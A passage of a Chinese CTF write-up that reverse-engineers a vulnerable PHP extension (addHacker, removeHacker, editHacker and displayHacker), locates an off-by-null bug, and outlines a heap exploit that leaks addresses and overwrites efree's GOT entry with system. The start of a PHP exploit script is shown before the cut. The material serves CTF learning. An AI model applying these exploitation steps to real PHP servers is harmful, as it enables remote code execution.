		<span class="token class-name">uint32_t</span>     next<span class="token punctuation">;</span>                 <span class="token comment">/* hash collision chain */</span>
		<span class="token class-name">uint32_t</span>     cache_slot<span class="token punctuation">;</span>           <span class="token comment">/* cache slot (for RECV_INIT) */</span>
		<span class="token class-name">uint32_t</span>     opline_num<span class="token punctuation">;</span>           <span class="token comment">/* opline number (for FAST_CALL) */</span>
		<span class="token class-name">uint32_t</span>     lineno<span class="token punctuation">;</span>               <span class="token comment">/* line number (for ast nodes) */</span>
		<span class="token class-name">uint32_t</span>     num_args<span class="token punctuation">;</span>             <span class="token comment">/* arguments number for EX(This) */</span>
		<span class="token class-name">uint32_t</span>     fe_pos<span class="token punctuation">;</span>               <span class="token comment">/* foreach position */</span>
		<span class="token class-name">uint32_t</span>     fe_iter_idx<span class="token punctuation">;</span>          <span class="token comment">/* foreach iterator index */</span>
		<span class="token class-name">uint32_t</span>     guard<span class="token punctuation">;</span>                <span class="token comment">/* recursion and single property guard */</span>
		<span class="token class-name">uint32_t</span>     constant_flags<span class="token punctuation">;</span>       <span class="token comment">/* constant flags */</span>
		<span class="token class-name">uint32_t</span>     extra<span class="token punctuation">;</span>                <span class="token comment">/* not further specified */</span>
	<span class="token punctuation">&#125;</span> u2<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中关于类型的定义是这样的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_UNDEF</span>     <span class="token expression"><span class="token number">0</span> </span><span class="token comment">/* A variable that was never written to. */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_NULL</span>      <span class="token expression"><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_FALSE</span>     <span class="token expression"><span class="token number">2</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_TRUE</span>      <span class="token expression"><span class="token number">3</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_LONG</span>      <span class="token expression"><span class="token number">4</span> </span><span class="token comment">/* An integer value. */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_DOUBLE</span>    <span class="token expression"><span class="token number">5</span> </span><span class="token comment">/* A floating point value. */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_STRING</span>    <span class="token expression"><span class="token number">6</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_ARRAY</span>     <span class="token expression"><span class="token number">7</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_OBJECT</span>    <span class="token expression"><span class="token number">8</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_RESOURCE</span>  <span class="token expression"><span class="token number">9</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IS_REFERENCE</span> <span class="token expression"><span class="token number">10</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以从这里可以判断出addhacker这个函数有两个字符串类型的参数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>arg2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> arg1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> arg2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">6</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后代码中的 arg1 + 0x10 arg1 + 0x18 arg2 + 0x10 arg2 + 0x18调试了一下发现 + 0x10 取字符串的长度，+ 0x18是取字符串的基地址</p>
<p>chunklist的结构是这样的</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x &#x2F;100gx 0x7d6e061d7160
0x7d6e061d7160 &lt;chunkList&gt;:     0x0000000000000000      0x0000000000000001
0x7d6e061d7170 &lt;chunkList+16&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d7180 &lt;chunkList+32&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d7190 &lt;chunkList+48&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d71a0 &lt;chunkList+64&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d71b0 &lt;chunkList+80&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d71c0 &lt;chunkList+96&gt;:  0x0000000000000000      0x0000000000000001
0x7d6e061d71d0 &lt;chunkList+112&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d71e0 &lt;chunkList+128&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d71f0 &lt;chunkList+144&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7200 &lt;chunkList+160&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7210 &lt;chunkList+176&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7220 &lt;chunkList+192&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7230 &lt;chunkList+208&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7240 &lt;chunkList+224&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7250 &lt;chunkList+240&gt;: 0x0000000000000000      0x0000000000000001
0x7d6e061d7260: 0x0000000000000000      0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以这段代码的用途是在chunklist中找一个可用的空间，然后通过arg1的长度和arg2 + 0x10的长度申请两个堆，把arg1申请出来的堆写到arg2的堆里，最后把通过arg2堆写回chunklist，同时修改chunklist中inuse的标志位</p>
<p>写回chunklist逻辑附近有一个off by null的漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">  *(_QWORD *)v7 &#x3D; v8;
  *((_DWORD *)v7 + 2) &#x3D; 13;
  *((_BYTE *)v8 + v13 + 16) &#x3D; 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="zif-removeHacker"><a href="#zif-removeHacker" class="headerlink" title="zif_removeHacker"></a>zif_removeHacker</h4><pre class="line-numbers language-none"><code class="language-none">unsigned __int64 __fastcall zif_removeHacker(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
&#123;
  __int64 v4; &#x2F;&#x2F; rdi
  _DWORD *v6; &#x2F;&#x2F; rax
  _QWORD *v7; &#x2F;&#x2F; rbp
  __int64 arg1; &#x2F;&#x2F; [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v9; &#x2F;&#x2F; [rsp+8h] [rbp-20h]

  v4 &#x3D; *(unsigned int *)(a1 + 44);
  v9 &#x3D; __readfsqword(0x28u);
  if ( (unsigned int)zend_parse_parameters(v4, &amp;unk_2001, &amp;arg1, a4) !&#x3D; -1 )
  &#123;
    if ( *(_BYTE *)(arg1 + 8) !&#x3D; 4
      || (v6 &#x3D; &amp;chunkList[4 * *(_QWORD *)arg1], *((_BYTE *)v6 + 8) &#x3D;&#x3D; 1)
      || *(_QWORD *)arg1 &gt; 0xFuLL )
    &#123;
      *(_DWORD *)(a2 + 8) &#x3D; 1;
    &#125;
    else
    &#123;
      v7 &#x3D; *(_QWORD **)v6;
      _efree(**(_QWORD **)v6);
      _efree(v7);
      chunkList[4 * *(_QWORD *)arg1 + 2] &#x3D; 1;
    &#125;
  &#125;
  return v9 - __readfsqword(0x28u);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>removeHacker只有一个整型参数idx, 传递idx过去后会根据idx去chunklist中找到arg2堆，然后再根据arg2堆的内容找到arg1堆最后free掉两个堆，同时修改chunlist中的inuse标志位</p>
<h4 id="zif-editHacker"><a href="#zif-editHacker" class="headerlink" title="zif_editHacker"></a>zif_editHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>__fastcall <span class="token function">zif_editHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  <span class="token class-name">size_t</span> v7<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h] BYREF</span>
  _BYTE <span class="token operator">*</span>v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>

  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2000<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span>
    <span class="token operator">||</span> v10<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">6</span>
    <span class="token operator">||</span> <span class="token punctuation">(</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9<span class="token punctuation">,</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">></span> <span class="token number">0xFuLL</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v5 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">_efree</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>v5 <span class="token operator">=</span> v8<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">24LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">+</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>edithacker函数的用途是编辑和更新指定索引的 chunk 数据，如果新数据小于或等于当前 chunk 的大小则直接覆盖，否则重新分配内存并复制新数据</p>
<h4 id="zif-displayHacker"><a href="#zif-displayHacker" class="headerlink" title="zif_displayHacker"></a>zif_displayHacker</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">zif_displayHacker</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment">// r13</span>
  <span class="token class-name">size_t</span> v8<span class="token punctuation">;</span> <span class="token comment">// r12</span>
  _QWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-38h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-30h]</span>

  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">zend_parse_parameters</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_2001<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">,</span> a4<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span>v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>chunkList <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10<span class="token punctuation">,</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">></span> <span class="token number">0xFuLL</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span>
      v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_emalloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFFFFFFFF8LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span>v9 <span class="token operator">=</span> <span class="token number">0x1600000001LL</span><span class="token punctuation">;</span>
      v9<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      v9<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
      <span class="token function">memcpy</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">+</span> v8 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a2 <span class="token operator">=</span> v9<span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">262</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v11 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>displahacker函数的用途是根据指定索引从chunklist中获取对应chunk的数据，然后返回一个对应的字符串对象</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/03/06/2021-antCTF/">https://a1ex.online/2021/03/06/2021-antCTF/</a></p>
<p><a target="_blank" rel="noopener" href="https://qanux.github.io/2024/04/29/d3ctf2024/index.html#PwnShell">https://qanux.github.io/2024/04/29/d3ctf2024/index.html#PwnShell</a></p>
<p>通过linux 伪文件系统泄露libc基地址和模块基地址后，通过堆风水破坏free list构造任意地址写的原语，将 efree的got表覆盖成system，之后去free一个内容为 binsh的堆就好了，不过php pwn不能直接getshell，得反弹shell或者是用readflag把 flag读出来</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">str2Hex</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$hex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token variable">$hex</span><span class="token operator">.=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hex</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$hex</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$hex</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">int2Str</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token variable">$x</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$re</span> <span class="token operator">.=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$i</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function-definition function">leakaddr</span><span class="token punctuation">(</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$libc</span><span class="token punctuation">,</span><span class="token variable">$mbase</span><span class="token punctuation">;</span>
    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/'</span><span class="token punctuation">;</span>
